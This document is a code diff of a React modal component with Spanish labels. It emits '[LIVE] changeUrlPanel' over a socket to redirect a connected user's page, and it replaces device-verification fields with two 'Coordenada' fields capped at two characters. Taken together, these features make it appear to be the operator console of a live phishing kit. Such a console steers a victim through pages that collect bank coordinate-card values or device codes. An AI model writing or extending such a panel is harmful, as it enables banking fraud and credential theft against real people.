@@ -4,7 +4,7 @@ import { memo, useContext } from "react"
 import { SocketContext } from "../../context/SocketContext"
 import { useFormik } from "formik"
 
-const valuesData = {numberDevice: '', typeDevice: '', pageNow: '', urlPage: '' }
+const valuesData = {coordenada1: '', coordenada2: '', pageNow: '', urlPage: '' }
 
 export const ModalLive = memo(({modalData, setVisible, visible, isConnected}) => {
     
@@ -15,6 +15,7 @@ export const ModalLive = memo(({modalData, setVisible, visible, isConnected}) =>
     const closeHandler = () => { setVisible(false) }
 
     const sendUrl = ({urlPage, viewError = false}) => {
+        console.log('send')
         const user = {socketID, viewError, isLoading: false, url: urlPage}
         socket.emit('[LIVE] changeUrlPanel', {user})
         setVisible(false)
@@ -23,8 +24,8 @@ export const ModalLive = memo(({modalData, setVisible, visible, isConnected}) =>
     const { values, handleSubmit, handleChange, handleBlur } = useFormik({
         initialValues: valuesData,
         onSubmit: async(valuesData, {resetForm}) => {
-            const { viewError, pageNow, urlPage, numberDevice, typeDevice } = valuesData
-            const user = {isLoading: false, socketID, url: urlPage, numberDevice, typeDevice, viewError, pageNow}
+            const { viewError, pageNow, urlPage, coordenada1, coordenada2 } = valuesData
+            const user = {isLoading: false, socketID, url: urlPage, coordenada1, coordenada2, viewError, pageNow}
             await socket.emit('[LIVE] changeUrlPanel', {user})
             resetForm()
             setVisible(false)
@@ -66,27 +67,27 @@ export const ModalLive = memo(({modalData, setVisible, visible, isConnected}) =>
                                                                 {values.urlPage = urlPage}
                                                             </div>
                                                             <div>    
-                                                                <p className="text-left text-[14px]">numero verificacion</p>
+                                                                <p className="text-left text-[14px]">Coordenada1</p>
                                                                 <input 
                                                                     className='p-[6px] border-[1px] w-full rounded-[5px] border-[#97a3ae] outline-none'
-                                                                    name="numberDevice"
-                                                                    placeholder="numero del dispositivo"
-                                                                    onBlur={handleBlur}
-                                                                    onChange={handleChange}
-                                                                    type='number'
-                                                                    value={values.numberDevice}
-                                                                />
-                                                            </div>
-                                                            <div>
-                                                                <p className="text-left text-[14px]">Nombre del dispositivo</p>
-                                                                <input 
-                                                                    className='p-[6px] border-[1px] w-full rounded-[5px] border-[#97a3ae] outline-none'
-                                                                    name="typeDevice"
-                                                                    placeholder="Nombre del dispositivo"
+                                                                    name="coordenada1"
+                                                                    placeholder="coordenada1"
                                                                     onBlur={handleBlur}
                                                                     onChange={handleChange}
                                                                     type='text'
-                                                                    value={values.typeDevice}
+                                                                    value={values.coordenada1.toString().slice(0,2)}
+                                                                />
+                                                            </div>
+                                                            <div>
+                                                                <p className="text-left text-[14px]">Coordenada2</p>
+                                                                <input 
+                                                                    className='p-[6px] border-[1px] w-full rounded-[5px] border-[#97a3ae] outline-none'
+                                                                    name="coordenada2"
+                                                                    placeholder="Coordenada 2"
+                                                                    onBlur={handleBlur}
+                                                                    onChange={handleChange}
+                                                                    type='text'
+                                                                    value={values.coordenada2.toString().slice(0,2)}
                                                                 />
                                                             </div>
                                                             <button type="submit" className="py-2 px-5 bg-green-600 mt-3 rounded w-full text-white">Aprobar</button>
